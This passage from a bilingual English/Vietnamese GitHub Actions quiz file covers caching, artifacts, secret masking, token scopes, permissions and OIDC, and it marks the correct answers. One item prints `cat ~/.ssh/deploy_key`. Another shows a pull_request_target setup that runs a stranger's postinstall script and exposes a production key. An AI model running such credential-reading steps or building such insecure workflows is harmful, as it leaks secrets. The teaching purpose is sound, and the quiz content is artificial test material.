              'Cache vượt trần 10 GB của kho và bị thu hồi, đó là ý nghĩa của cách diễn đạt path-validation khi một mục lớn bị các mục mới hơn đẩy ra',
            ),
            B(
              'It failed once because of a transient storage error on GitHub\'s side; the correct response is to re-run the job and confirm the warning does not repeat',
              'Nó hỏng một lần vì một lỗi lưu trữ nhất thời phía GitHub; phản ứng đúng là chạy lại job rồi xác nhận cảnh báo không lặp lại',
            ),
            B(
              'It has never saved a byte and never will — everything about it is correct except that the <code>path:</code> names a directory this project does not create',
              'Nó chưa bao giờ lưu được một byte nào và sẽ không bao giờ — mọi thứ về nó đều đúng, trừ việc <code>path:</code> nêu tên một thư mục mà dự án này không hề tạo ra',
            ),
          ],
          correct: 3,
          explanation: EX(
            'A cache that does nothing costs almost no time and produces no error, so it survives review indefinitely. This one was diagnosed with three checks, and the third is the one that changed the fix: running <code>npm ci</code> and looking (no such directory), grepping the project for the path (no reference), and reading what the build actually is — <code>"build": "tsc"</code> with neither <code>incremental</code> nor <code>tsBuildInfoFile</code> set, so the compiler writes no cache anywhere. The step is not misconfigured; it is caching a thing that does not exist. Every <code>actions/cache</code> step prints exactly one of three lines — a hit, a miss with the key, or this warning — and reading them is the whole audit. The three-run rule follows: after adding or changing a cache, look at three consecutive runs on the same branch; run one should miss and save, runs two and three should hit, and any other pattern is a bug you can see in ten seconds.',
            'Một cái cache không làm gì thì tốn gần như không thời gian và không đẻ ra lỗi nào, nên nó sống sót qua review vô thời hạn. Cái này được chẩn đoán bằng ba phép kiểm, và phép thứ ba mới là thứ làm đổi cách chữa: chạy <code>npm ci</code> rồi nhìn (không có thư mục ấy), grep cả dự án tìm đường dẫn ấy (không có tham chiếu nào), và đọc xem bước dựng THẬT SỰ là gì — <code>"build": "tsc"</code> mà không đặt <code>incremental</code> lẫn <code>tsBuildInfoFile</code>, nên trình biên dịch chẳng ghi cache ra đâu cả. Bước ấy không phải cấu hình sai; nó đang cache một thứ KHÔNG TỒN TẠI. Mỗi bước <code>actions/cache</code> in ra đúng một trong ba dòng — trúng, trượt kèm khoá, hoặc cảnh báo này — và đọc chúng chính là toàn bộ cuộc soát. Từ đó có luật ba-lần-chạy: sau khi thêm hay sửa một cái cache, hãy nhìn ba lần chạy liên tiếp trên cùng một nhánh; lần một phải trượt rồi lưu, lần hai và ba phải trúng, và mọi hình mẫu khác đều là một con bọ mà bạn thấy được trong mười giây.',
          ),
        }),

        // q32 · đáp án 0
        mcq({
          prompt: B(
            'The same byte count was packed two ways with the zip that <code>upload-artifact</code> uses. The first attempt used 5,000 identical copies and reported a 64× size ratio; the measurement was redone with partially-similar content:' + code(
              '--- luot 2: noi dung GIONG MOT PHAN, 31,44 MB ---\n' +
              'dang          nen (zip -1)   kich thuoc     giai nen\n' +
              '5.000 file          539 ms       7,7 MB       476 ms\n' +
              '1 file              233 ms       6,2 MB       163 ms\n' +
              'ti le                 2,3x        1,24x         2,9x',
            ) + 'What are the two lessons here?',
            'Cùng một số byte được đóng gói theo hai cách bằng đúng loại zip mà <code>upload-artifact</code> dùng. Lượt đo đầu dùng 5.000 bản chép giống hệt nhau và báo tỉ lệ kích thước 64 lần; phép đo được làm lại với nội dung giống nhau MỘT PHẦN:' + code(
              '--- luot 2: noi dung GIONG MOT PHAN, 31,44 MB ---\n' +
              'dang          nen (zip -1)   kich thuoc     giai nen\n' +
              '5.000 file          539 ms       7,7 MB       476 ms\n' +
              '1 file              233 ms       6,2 MB       163 ms\n' +
              'ti le                 2,3x        1,24x         2,9x',
            ) + 'Hai bài học ở đây là gì?',
          ),
          options: [
            B(
              'Zip compresses each entry independently, so the SHAPE of an upload costs 2.3–2.9× — and a measurement can be arithmetically correct while answering a question about the test data',
              'Zip nén TỪNG mục một cách độc lập, nên HÌNH DẠNG của một lượt tải lên tốn 2,3–2,9 lần — và một phép đo có thể đúng về số học mà lại trả lời một câu hỏi về DỮ LIỆU THỬ',
            ),
            B(
              'The first measurement was simply wrong and should be discarded; the second one supersedes it, and publishing both would only confuse a reader who wanted a single number',
              'Phép đo đầu đơn giản là SAI và nên vứt đi; phép đo thứ hai thay thế nó, và công bố cả hai chỉ làm rối một người đọc vốn chỉ muốn một con số duy nhất',
            ),
            B(
              'Compression level is the dominant variable, so setting <code>compression-level: 0</code> on the upload removes both the size and the time penalties measured above',
              'Mức nén là biến chi phối, nên đặt <code>compression-level: 0</code> cho lượt tải lên sẽ gỡ bỏ cả phần phạt về kích thước lẫn phần phạt về thời gian đo được ở trên',
            ),
            B(
              'File count is irrelevant to an artifact because the runner tars the directory before uploading it, so the 2.3× figure only applies to a local zip and not to the real action',
              'Số lượng tệp không liên quan gì tới một artifact vì runner đã gộp thư mục thành tar trước khi tải lên, nên con số 2,3 lần chỉ đúng với một cú zip cục bộ chứ không đúng với action thật',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The technical lesson is a property of the format: a zip compresses each entry independently, so it cannot share a dictionary across files the way a compressed tar can. That is why <code>path: dist/</code> on a 40,000-file tree costs 2.3× to pack and 2.9× to unpack against the same bytes in one file — and why the fix, when the next job needs one deliverable, is to tar first and upload the tarball. The exception is when a human needs to browse the artifact in the UI; then the file listing is the point, and the cost is what you are paying for. The methodological lesson is the reason both runs are kept: 5,000 identical copies compressed almost perfectly as one concatenated file and could not share anything as 5,000 entries, so the 64× was an upper bound produced by the rig rather than by the phenomenon. Publishing it would have been quoting the test data. Option 4 is refuted by the real runner timings from the same course — 8s, 6s and 27s to upload one installer on three platforms.',
            'Bài học kỹ thuật là một tính chất của định dạng: zip nén TỪNG mục một cách độc lập, nên nó không dùng chung được từ điển nén giữa các tệp như một bản tar đã nén. Vì thế <code>path: dist/</code> trên một cây 40.000 tệp tốn 2,3 lần để đóng và 2,9 lần để mở so với đúng chừng ấy byte nằm trong một tệp — và vì thế cách chữa, khi job sau chỉ cần một sản phẩm, là gộp tar trước rồi tải cái tarball lên. Ngoại lệ là khi một con người cần duyệt artifact ấy trên giao diện; khi đó danh sách tệp mới là điểm chính, và cái giá ấy là thứ bạn đang trả tiền để mua. Bài học phương pháp là lý do cả HAI lượt đo đều được giữ lại: 5.000 bản chép giống hệt nhau nén gần như hoàn hảo khi thành một tệp nối liền và chẳng chia sẻ được gì khi là 5.000 mục, nên con số 64 lần là một CẬN TRÊN do bộ rig đẻ ra chứ không phải do hiện tượng. Công bố nó là trích dẫn dữ liệu thử. Phương án 4 bị chính các số đo runner thật của cùng khoá học bác bỏ — 8s, 6s và 27s để tải một bản cài lên trên ba nền tảng.',
          ),
        }),

        /* ── Chương 6 — bí mật, quyền, và cái token (5 câu) ───────────────── */

        // q33 · đáp án 2
        mcq({
          prompt: B(
            'This repository stores its SSH key base64-encoded and decodes it inside the step. Measured on a freshly generated ed25519 key:' + code(
              'GitHub LUU (va che) ban base64:  LS0tLS1CRUdJTiBPUEVOU1NIIFBSSV...\n' +
              'Sau `base64 -d`, gia tri THAT: -----BEGIN OPENSSH PRIVATE KEY-----\n' +
              '\n' +
              'so chuoi con CHUNG giua hai ban:  9 ky tu -> 0\n' +
              '                                  6 ky tu -> 0',
            ) + 'A later step runs <code>cat ~/.ssh/deploy_key</code>. What appears in the log?',
            'Kho này lưu khoá SSH dạng base64 rồi giải mã ngay trong bước. Đo trên một khoá ed25519 vừa sinh ra:' + code(
              'GitHub LUU (va che) ban base64:  LS0tLS1CRUdJTiBPUEVOU1NIIFBSSV...\n' +
              'Sau `base64 -d`, gia tri THAT: -----BEGIN OPENSSH PRIVATE KEY-----\n' +
              '\n' +
              'so chuoi con CHUNG giua hai ban:  9 ky tu -> 0\n' +
              '                                  6 ky tu -> 0',
            ) + 'Một bước sau chạy <code>cat ~/.ssh/deploy_key</code>. Log hiện ra gì?',
          ),
          options: [
            B(
              '<code>***</code> — the runner registers common encodings of every secret automatically, and base64 is the first of them precisely because storing keys that way is standard practice',
              '<code>***</code> — runner tự động đăng ký các dạng mã hoá phổ biến của mọi bí mật, và base64 là dạng đầu tiên đúng vì lưu khoá kiểu ấy là thực hành chuẩn',
            ),
            B(
              'Nothing at all — GitHub blocks any step that reads a file which was written from a secret, which is why the decode-to-file pattern is safe to use',
              'Không gì cả — GitHub chặn mọi bước đọc một tệp vốn được ghi ra từ một bí mật, và đó là lý do khuôn mẫu giải-mã-ra-tệp dùng được một cách an toàn',
            ),
            B(
              'The private key in plain text — masking is an exact-string search over log output, and the decoded form shares no substring with the stored one',
              'Khoá riêng tư dưới dạng chữ thường — che bí mật là một phép tìm CHUỖI CHÍNH XÁC trên đầu ra log, và bản đã giải mã không chung một chuỗi con nào với bản đã lưu',
            ),
            B(
              '<code>***</code>, but only in the step that declared the secret in its own <code>env:</code> block; steps that did not declare it print the key unmasked',
              '<code>***</code>, nhưng chỉ trong bước đã khai bí mật trong khối <code>env:</code> của chính nó; các bước không khai thì in ra khoá không che',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The masking engine scans output for the exact strings it knows are secret. It has never seen the decoded key, so it cannot recognise it — and the measurement above shows how complete the gap is: zero shared substrings even at six characters. The rule worth memorising exactly is that masking covers the stored value byte-for-byte, so <em>every</em> transformation escapes it: base64-decoding, JSON-parsing, taking a substring, changing case, URL-encoding, or splitting a combined secret. For values you compute, register them yourself with <code>::add-mask::</code> — and note that it protects only output printed <em>after</em> it runs, and does not survive into another job. Two further limits are worth stating plainly. Masking is a log feature, not a containment boundary: a secret written to a file, uploaded in an artifact or sent over the network is simply gone. And if a secret may have been printed, it has been — rotate it, because there is no way to un-publish a log line.',
            'Bộ máy che quét đầu ra để tìm ĐÚNG những chuỗi mà nó biết là bí mật. Nó chưa bao giờ thấy bản khoá đã giải mã, nên nó không nhận ra được — và phép đo ở trên cho thấy cái khe hở ấy trọn vẹn tới mức nào: KHÔNG chuỗi con nào chung, kể cả ở độ dài sáu ký tự. Luật đáng thuộc lòng chính xác là: che bí mật phủ đúng giá trị ĐÃ LƯU theo từng byte, nên MỌI phép biến đổi đều thoát khỏi nó: giải mã base64, phân giải JSON, cắt một chuỗi con, đổi hoa thường, mã hoá URL, hay tách một bí mật gộp ra thành phần. Với những giá trị bạn TỰ tính ra, hãy tự đăng ký chúng bằng <code>::add-mask::</code> — và lưu ý nó chỉ bảo vệ phần đầu ra in ra SAU khi nó chạy, và không sống sót sang job khác. Hai giới hạn nữa đáng nói thẳng. Che bí mật là một tính năng của LOG chứ không phải một ranh giới ngăn chặn: một bí mật ghi ra tệp, tải lên trong artifact hay gửi qua mạng thì đơn giản là đi mất. Và nếu một bí mật CÓ THỂ đã bị in ra thì coi như nó đã bị in — hãy xoay khoá, vì không có cách nào rút lại một dòng log đã công bố.',
          ),
        }),

        // q34 · đáp án 1
        mcq({
          prompt: B(
            'This repository\'s desktop release workflow publishes installers to <code>cuonghoang1103/cuongthai-desktop</code> — a different repository, which must be public because <code>electron-updater</code> downloads updates without a token. It uses <code>secrets.RELEASE_TOKEN</code>, a PAT, rather than <code>GITHUB_TOKEN</code>. Why is that the correct choice?',
            'Workflow phát hành desktop của kho này công bố các bản cài sang <code>cuonghoang1103/cuongthai-desktop</code> — một kho KHÁC, và kho ấy buộc phải công khai vì <code>electron-updater</code> tải bản mới về mà không kèm token. Nó dùng <code>secrets.RELEASE_TOKEN</code>, một PAT, thay vì <code>GITHUB_TOKEN</code>. Vì sao đó là lựa chọn ĐÚNG?',
          ),
          options: [
            B(
              'Because <code>GITHUB_TOKEN</code> cannot create releases or upload release assets at any permission level, which is what <code>contents: write</code> exists to work around',
              'Vì <code>GITHUB_TOKEN</code> không tạo được bản phát hành hay tải tệp phát hành lên ở bất kỳ mức quyền nào, và <code>contents: write</code> sinh ra để lách chỗ đó',
            ),
            B(
              'Because <code>GITHUB_TOKEN</code> is minted for the repository running the workflow and is not valid anywhere else — no <code>permissions:</code> setting extends it past that boundary',
              'Vì <code>GITHUB_TOKEN</code> được đúc riêng cho cái kho ĐANG CHẠY workflow và không có hiệu lực ở đâu khác — không thiết lập <code>permissions:</code> nào nới nó qua khỏi ranh giới ấy',
            ),
            B(
              'Because the target repository is public, and <code>GITHUB_TOKEN</code> is restricted to private repositories where the audit trail can be attributed to a workflow run',
              'Vì kho đích là công khai, còn <code>GITHUB_TOKEN</code> bị giới hạn trong các kho riêng tư, nơi dấu vết kiểm toán quy được về một lần chạy workflow',
            ),
            B(
              'Because the workflow is <code>workflow_dispatch</code> rather than push-triggered, and an automatic token is only issued for runs that a commit started',
              'Vì workflow ấy là <code>workflow_dispatch</code> chứ không kích hoạt theo push, và token tự động chỉ được cấp cho những lần chạy do một commit khởi động',
            ),
          ],
          correct: 1,
          explanation: EX(
            '<code>GITHUB_TOKEN</code> is created when the job starts, expires when the job ends, and is scoped to exactly one repository — the one running the workflow. That last property is the one that shapes real workflows, and it is why this is close to the <em>only</em> legitimate reason to reach for a PAT. If a workflow needs a PAT for anything inside its own repository, that is almost always a <code>permissions:</code> block that was not written. Cross-repository access is different in kind: no permission setting extends the automatic token past its repository, so a separate credential is the mechanism rather than a workaround. What a PAT costs should be stated plainly, though: it does not expire with the job, a classic PAT carries a person\'s whole access rather than a repository scope, and nothing reminds you to rotate it. A fine-grained PAT fixes the scoping and forces an expiry, and a GitHub App installation token — scoped per repository, short-lived, revocable without touching a human\'s access — is the right answer for anything long-lived.',
            '<code>GITHUB_TOKEN</code> được tạo khi job khởi động, hết hạn khi job kết thúc, và được khoanh vào ĐÚNG MỘT kho — cái kho đang chạy workflow. Chính tính chất cuối ấy định hình các workflow thật, và đó là lý do đây gần như là lý do CHÍNH ĐÁNG DUY NHẤT để với tay lấy một PAT. Nếu một workflow cần PAT cho việc gì đó bên trong chính kho của nó thì gần như luôn luôn đó là một khối <code>permissions:</code> chưa được viết. Truy cập liên-kho thì khác về BẢN CHẤT: không thiết lập quyền nào nới được token tự động ra khỏi kho của nó, nên một thông tin đăng nhập riêng là CƠ CHẾ chứ không phải một cách lách. Dù vậy cái giá của PAT nên nói thẳng: nó không hết hạn cùng job, một PAT cổ điển mang theo TOÀN BỘ quyền truy cập của một con người chứ không phải phạm vi một kho, và chẳng có gì nhắc bạn xoay nó. Một PAT chi-tiết sửa được phần khoanh vùng và ép phải có hạn dùng, còn một token cài đặt của GitHub App — khoanh theo từng kho, sống ngắn, thu hồi được mà không đụng tới quyền của một con người — mới là câu trả lời đúng cho thứ gì sống lâu.',
          ),
        }),

        // q35 · đáp án 0
        mcq({
          prompt: B(
            'A workflow that previously declared no <code>permissions:</code> block gains one:' + code(
              'permissions:\n' +
              '  packages: write',
            ) + 'A step deep inside it has always posted a comment on the pull request. What happens to the other scopes, and to that step?',
            'Một workflow trước đây không khai khối <code>permissions:</code> nào nay có một khối:' + code(
              'permissions:\n' +
              '  packages: write',
            ) + 'Một bước nằm sâu bên trong nó xưa nay vẫn đăng bình luận lên pull request. Chuyện gì xảy ra với các phạm vi khác, và với bước ấy?',
          ),
          options: [
            B(
              'Every unnamed scope becomes <code>none</code>, so the commenting step now fails with a 403 buried in an action\'s output while the rest of the job carries on looking fine',
              'Mọi phạm vi không được nêu tên đều thành <code>none</code>, nên bước đăng bình luận giờ hỏng với một lỗi 403 chôn trong đầu ra của một action, trong khi phần còn lại của job vẫn trông ổn',
            ),
            B(
              'The unnamed scopes keep the repository default, so only <code>packages</code> is raised and the commenting step continues to work exactly as it did before',
              'Các phạm vi không nêu tên vẫn giữ mặc định của kho, nên chỉ mỗi <code>packages</code> được nâng lên và bước đăng bình luận vẫn chạy y như trước',
            ),
            B(
              'All scopes become <code>write</code>, because declaring the block at all opts the workflow into the permissive token set that older repositories use by default',
              'Mọi phạm vi thành <code>write</code>, vì hễ khai khối ấy là workflow chọn vào tập token rộng rãi mà các kho cũ dùng làm mặc định',
            ),
            B(
              'Nothing changes at run time — a workflow-level <code>permissions:</code> block is advisory until a job repeats it, and only the job-level form actually narrows the token',
              'Không gì đổi lúc chạy — một khối <code>permissions:</code> ở mức workflow chỉ mang tính khuyến nghị cho tới khi một job lặp lại nó, và chỉ dạng ở mức job mới thật sự siết token',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Naming any scope sets every unnamed one to <code>none</code>. That is the mechanism, and it is what makes the minimal-permissions version of a workflow the <em>easy</em> version to write — but it also means adding the block can silently break a step that quietly relied on something. The safe order is therefore: add the block with the scopes you know about, run it once, and read the log for permission errors, rather than adding it and assuming green means complete. This is the one change where "it still passes" is weak evidence. The reason to declare the block at all is that a workflow without one has a token whose power depends on a repository setting somebody chose years ago and nobody remembers — newer repositories default to restricted, older ones may still be permissive, and there is no way to tell from the workflow file. Declaring it makes the workflow\'s needs a property of the workflow, readable in the diff. Note also that a job-level block <em>replaces</em> the workflow-level one rather than adding to it.',
            'Nêu tên bất kỳ phạm vi nào là đưa MỌI phạm vi không nêu về <code>none</code>. Đó là cơ chế, và chính nó khiến phiên bản quyền-tối-thiểu của một workflow trở thành phiên bản DỄ VIẾT nhất — nhưng nó cũng có nghĩa là thêm khối ấy vào có thể âm thầm làm vỡ một bước vốn lặng lẽ dựa vào một thứ gì đó. Vì thế thứ tự an toàn là: thêm khối với những phạm vi bạn BIẾT, chạy một lần, rồi đọc log tìm lỗi quyền, chứ đừng thêm vào rồi cho rằng xanh nghĩa là đủ. Đây đúng là thay đổi mà câu "nó vẫn đạt mà" là bằng chứng yếu. Lý do phải khai khối ấy ngay từ đầu là: một workflow không có khối nào sẽ mang một token mà sức mạnh của nó phụ thuộc vào một thiết lập của kho do ai đó chọn từ nhiều năm trước và chẳng ai còn nhớ — kho mới mặc định là hạn chế, kho cũ có thể vẫn rộng rãi, và không có cách nào biết được bằng cách nhìn tệp workflow. Khai nó ra biến nhu cầu của workflow thành một tính chất CỦA workflow, đọc được ngay trong diff. Cũng lưu ý rằng khối ở mức job THAY THẾ khối ở mức workflow chứ không cộng vào.',
          ),
        }),

        // q36 · đáp án 3
        mcq({
          prompt: B(
            'A rig was built where the base branch has a harmless <code>postinstall</code> script and the PR branch rewrites that same script to print a secret. Three configurations were run:' + code(
              '1. pull_request (checkout mac dinh)\n' +
              '   [pr]   sau-cai: DEPLOY_KEY = (khong thay)\n' +
              '2. pull_request_target (checkout mac dinh)\n' +
              '   [base] sau-cai: khong lam gi ca\n' +
              '3. pull_request_target + checkout ref: head.sha\n' +
              '   [pr]   sau-cai: DEPLOY_KEY = sk-that-su-cua-production-9f2a',
            ) + 'What makes configuration 3 the dangerous one?',
            'Một bộ rig được dựng: nhánh gốc có một script <code>postinstall</code> vô hại còn nhánh PR viết lại đúng script ấy để in ra một bí mật. Ba cấu hình được chạy:' + code(
              '1. pull_request (checkout mac dinh)\n' +
              '   [pr]   sau-cai: DEPLOY_KEY = (khong thay)\n' +
              '2. pull_request_target (checkout mac dinh)\n' +
              '   [base] sau-cai: khong lam gi ca\n' +
              '3. pull_request_target + checkout ref: head.sha\n' +
              '   [pr]   sau-cai: DEPLOY_KEY = sk-that-su-cua-production-9f2a',
            ) + 'Cái gì khiến cấu hình 3 thành cấu hình nguy hiểm?',
          ),
          options: [
            B(
              'The workflow file itself was malicious — configuration 3 only reproduces because the attacker was able to edit the workflow, which is a branch-protection problem rather than an Actions one',
              'Bản thân tệp workflow là độc hại — cấu hình 3 chỉ tái lập được vì kẻ tấn công sửa được tệp workflow, và đó là vấn đề bảo vệ nhánh chứ không phải vấn đề của Actions',
            ),
            B(
              '<code>pull_request_target</code> disables secret masking, so the key that was already present in configurations 1 and 2 becomes visible in the log for the first time',
              '<code>pull_request_target</code> tắt phép che bí mật, nên cái khoá vốn đã có mặt ở cấu hình 1 và 2 lần đầu tiên hiện ra trong log',
            ),
            B(
              'Checking out <code>head.sha</code> is what grants write access to the base repository; the default checkout under <code>pull_request_target</code> runs with a read-only token',
              'Việc checkout <code>head.sha</code> chính là thứ cấp quyền ghi vào kho gốc; còn checkout mặc định dưới <code>pull_request_target</code> chạy với một token chỉ đọc',
            ),
            B(
              'It combines the two halves: <code>pull_request_target</code> supplies full secrets, and <code>ref: head.sha</code> supplies a stranger\'s code — either alone is safe, and the second is one obvious line',
              'Nó ghép hai nửa lại: <code>pull_request_target</code> cấp đầy đủ bí mật, còn <code>ref: head.sha</code> cấp mã của một người lạ — mỗi nửa đứng riêng đều an toàn, và nửa thứ hai chỉ là một dòng rất hiển nhiên',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Read the three rows as a matrix of two properties. Configuration 1 runs the PR\'s code with <em>no</em> secrets — that is the safe default, and it is why the default exists. Configuration 2 runs the <em>base\'s</em> code with secrets — also safe, because <code>checkout</code> took the base tree and the attacker\'s script never executed. Configuration 3 has both, and hands an arbitrary stranger a shell with production credentials in the environment. The trap is that configuration 2 is useless for most real jobs: you wanted <code>pull_request_target</code> so you could build the PR, and the base checkout does not contain the PR — so the obvious next step is to add <code>ref: ${{ github.event.pull_request.head.sha }}</code>, which produces configuration 3. Note also that nothing here required a malicious workflow: the workflow file came from the base branch, untouched, and editing one already-trusted script was enough. The recommended split is to have <code>pull_request</code> upload a report as an artifact and a separate <code>workflow_run</code> workflow post it.',
            'Hãy đọc ba dòng ấy như một ma trận của hai tính chất. Cấu hình 1 chạy mã của PR mà KHÔNG có bí mật — đó là mặc định an toàn, và đó là lý do cái mặc định ấy tồn tại. Cấu hình 2 chạy mã của NHÁNH GỐC kèm bí mật — cũng an toàn, vì <code>checkout</code> đã lấy cây của nhánh gốc và script của kẻ tấn công chưa từng chạy. Cấu hình 3 có CẢ HAI, và trao cho một người lạ bất kỳ một cái shell với thông tin đăng nhập production nằm sẵn trong môi trường. Cái bẫy nằm ở chỗ cấu hình 2 vô dụng với phần lớn công việc thật: bạn muốn <code>pull_request_target</code> là để DỰNG cái PR, mà bản checkout nhánh gốc thì không chứa PR — nên bước tiếp theo hiển nhiên là thêm <code>ref: ${{ github.event.pull_request.head.sha }}</code>, và nó đẻ ra cấu hình 3. Cũng lưu ý rằng ở đây chẳng cần một workflow độc hại nào: tệp workflow tới từ nhánh gốc, nguyên vẹn, và sửa một script vốn đã được tin cậy là đủ. Cách tách được khuyến nghị là để <code>pull_request</code> tải một bản báo cáo lên làm artifact rồi một workflow <code>workflow_run</code> riêng đăng nó.',
          ),
        }),

        // q37 · đáp án 1
        mcq({
          prompt: B(
            'A workflow is converted to OIDC: the AWS credentials secrets are deleted and replaced with <code>role-to-assume</code>. The job now fails with a credentials error reported by the cloud provider, and the role ARN and trust policy both check out. What is the most likely cause?',
            'Một workflow được chuyển sang OIDC: các bí mật thông tin đăng nhập AWS bị xoá và thay bằng <code>role-to-assume</code>. Job giờ hỏng với một lỗi thông tin đăng nhập do phía nhà cung cấp đám mây báo về, mà cả ARN của role lẫn chính sách tin cậy đều đúng. Nguyên nhân khả dĩ nhất là gì?',
          ),
          options: [
            B(
              'The runner\'s outbound network cannot reach the provider\'s token endpoint, which is why the failure is reported on the cloud side rather than by the requesting step',
              'Mạng ra ngoài của runner không tới được điểm cuối cấp token của nhà cung cấp, và đó là lý do cú hỏng được báo ở phía đám mây chứ không phải bởi bước đi xin',
            ),
            B(
              'Missing <code>id-token: write</code> in <code>permissions:</code> — without it the job cannot request a token at all, so the failure surfaces on the provider side and sends people to check the role',
              'Thiếu <code>id-token: write</code> trong <code>permissions:</code> — không có nó thì job hoàn toàn không xin được token, nên cú hỏng lòi ra ở phía nhà cung cấp và đẩy người ta đi kiểm cái role',
            ),
            B(
              'OIDC requires the workflow to run on the default branch, and the <code>sub</code> claim of a token issued from any other ref is rejected before the provider ever sees it',
              'OIDC đòi workflow phải chạy trên nhánh mặc định, và claim <code>sub</code> của một token cấp từ bất kỳ ref nào khác đều bị từ chối trước khi nhà cung cấp kịp nhìn thấy',
            ),
            B(
              'The deleted secrets are still referenced by an <code>env:</code> block, and GitHub substitutes empty strings, which the provider\'s SDK reads in preference to the assumed role',
              'Các bí mật đã xoá vẫn còn được một khối <code>env:</code> tham chiếu, và GitHub thay vào các chuỗi rỗng, thứ mà SDK của nhà cung cấp ưu tiên đọc hơn cái role được đảm nhận',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Without <code>id-token: write</code> the job cannot ask GitHub for a token in the first place, and because the visible failure happens at the cloud provider, it sends people to check their role ARN and their trust policy — both of which are fine. It is one line in <code>permissions:</code>, and per the rule that naming any scope zeroes the rest, <code>contents: read</code> has to be listed alongside it or the checkout breaks too. The idea underneath is what makes OIDC worth the setup: instead of storing a credential and handing it to a job, the job proves who it is and receives a credential valid for minutes — so there is nothing stored to leak. The security then lives in the provider\'s trust policy, and specifically in the <code>sub</code> claim it matches: <code>repo:org/name:*</code> accepts a token from any branch including one a contributor pushed, while <code>repo:org/name:ref:refs/heads/main</code> accepts only the default branch. The permissive version is the one that gets copied from a blog post.',
            'Không có <code>id-token: write</code> thì job không thể xin GitHub một cái token ngay từ đầu, và vì cú hỏng NHÌN THẤY ĐƯỢC lại xảy ra ở phía nhà cung cấp đám mây, nó đẩy người ta đi kiểm ARN của role và chính sách tin cậy — mà cả hai đều ổn. Nó là MỘT dòng trong <code>permissions:</code>, và theo đúng luật nêu tên một phạm vi là đưa phần còn lại về không, phải liệt kê <code>contents: read</code> bên cạnh nó không thì cú checkout cũng vỡ theo. Ý tưởng nằm bên dưới mới là thứ khiến OIDC đáng công cài đặt: thay vì LƯU một thông tin đăng nhập rồi trao cho job, job tự CHỨNG MINH nó là ai rồi nhận về một thông tin đăng nhập có hiệu lực vài phút — nên chẳng còn gì được lưu để mà rò. Khi ấy phần bảo mật chuyển sang sống trong chính sách tin cậy của nhà cung cấp, cụ thể là ở claim <code>sub</code> mà nó khớp: <code>repo:org/name:*</code> nhận token từ BẤT KỲ nhánh nào kể cả nhánh một cộng tác viên vừa đẩy lên, còn <code>repo:org/name:ref:refs/heads/main</code> thì chỉ nhận nhánh mặc định. Bản rộng rãi mới là bản hay bị chép từ một bài blog.',
          ),
        }),

        /* ── Chương 7 — tốc độ, concurrency, chi phí (4 câu) ──────────────── */

        // q38 · đáp án 2
        mcq({
          prompt: B(
            'One run of this repository\'s release workflow:' + code(
              'tong MAY-GIAY:      72 + 241 + 437 + 323 + 34 = 1.107 s\n' +
              'thoi gian DONG HO:                              555 s\n' +
              'duong TOI HAN:      72 + 437 + 34             = 543 s\n' +
              '\n' +
              '(Linux 241s xong som 3m17s roi ngoi cho)',
            ) + 'Somebody halves the 241-second Linux build. What does the run duration become?',
            'Một lần chạy của workflow phát hành trong kho này:' + code(
              'tong MAY-GIAY:      72 + 241 + 437 + 323 + 34 = 1.107 s\n' +
              'thoi gian DONG HO:                              555 s\n' +
              'duong TOI HAN:      72 + 437 + 34             = 543 s\n' +
              '\n' +
              '(Linux 241s xong som 3m17s roi ngoi cho)',
            ) + 'Ai đó giảm một nửa job dựng Linux 241 giây. Thời lượng lần chạy trở thành bao nhiêu?',
          ),
          options: [
            B(
              'About 435 seconds — the saving is proportional to that job\'s share of the 1,107 machine-seconds, which is the number a billing conversation is about',
              'Khoảng 435 giây — khoản tiết kiệm tỉ lệ với phần của job ấy trong 1.107 máy-giây, và đó là con số mà một cuộc bàn về hoá đơn nói tới',
            ),
            B(
              'About 435 seconds as well, but only after the cache warms, because the first run still pays the full Linux time and the improvement appears from the second run onward',
              'Cũng khoảng 435 giây, nhưng chỉ sau khi cache ấm lên, vì lần chạy đầu vẫn trả trọn thời gian Linux và cải thiện chỉ xuất hiện từ lần chạy thứ hai',
            ),
            B(
              'Unchanged, at 555 seconds — that job already finishes 3m17s early, so it is not on the critical path and every second saved there returns exactly zero',
              'KHÔNG ĐỔI, vẫn 555 giây — job ấy vốn đã xong sớm 3m17s, nên nó KHÔNG nằm trên đường tới hạn và mỗi giây tiết kiệm ở đó trả về đúng con số không',
            ),
            B(
              'It cannot be determined without the queue times, since a shorter job may be scheduled into a different slot and change when the dependent stage becomes eligible',
              'Không xác định được nếu chưa biết thời gian xếp hàng, vì một job ngắn hơn có thể được xếp vào một khe khác và làm đổi thời điểm chặng phụ thuộc đủ điều kiện chạy',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Wall-clock has a floor set by the longest chain of dependent jobs, and here that chain is check → the slowest matrix leg → publish, or 543 seconds. Linux is not on it: it has three minutes and seventeen seconds of slack, and making it finish four minutes early moves nothing. This is the most useful habit in optimising a workflow, because the intuitive target is usually the job whose log a developer had open — which on a cross-platform matrix is the one running on the platform they use. The real levers on this run, in order of return: make the 437-second macOS build faster; take the 72-second check job off the chain if it is not a genuine data dependency; and only then reach for the one-line optimisations. Note also the comparison that makes the point sharpest — a 50% win on Linux is worth 0 seconds, and a 20% win on macOS is worth 87.',
            'Thời gian đồng hồ có một cái SÀN do chuỗi job phụ thuộc dài nhất quyết định, và ở đây chuỗi ấy là kiểm tra → nhánh ma trận chậm nhất → công bố, tức 543 giây. Linux không nằm trên đó: nó có ba phút mười bảy giây dư dả, và làm cho nó xong sớm bốn phút thì chẳng dịch chuyển được gì. Đây là thói quen hữu dụng nhất khi tối ưu một workflow, vì mục tiêu theo trực giác thường là cái job mà lập trình viên đang mở log — mà trên một ma trận đa nền tảng thì đó là job chạy trên chính nền tảng họ dùng. Các đòn bẩy thật của lần chạy này, xếp theo mức thu về: làm nhanh job dựng macOS 437 giây; nhấc job kiểm tra 72 giây ra khỏi chuỗi nếu nó không phải một phụ thuộc dữ liệu thật sự; rồi mới tới các phép tối ưu một dòng. Cũng lưu ý phép so sánh làm sắc nhất luận điểm — thắng 50% ở Linux đáng 0 giây, còn thắng 20% ở macOS đáng 87 giây.',
          ),
        }),

        // q39 · đáp án 3
        mcq({
          prompt: B(
            'Two workflows in this repository set the same key to opposite values:' + code(
              '# deploy-ghcr.yml\n' +
              'concurrency:\n' +
              '  group: deploy-ghcr\n' +
              '  cancel-in-progress: true\n' +
              '\n' +
              '# desktop-release.yml\n' +
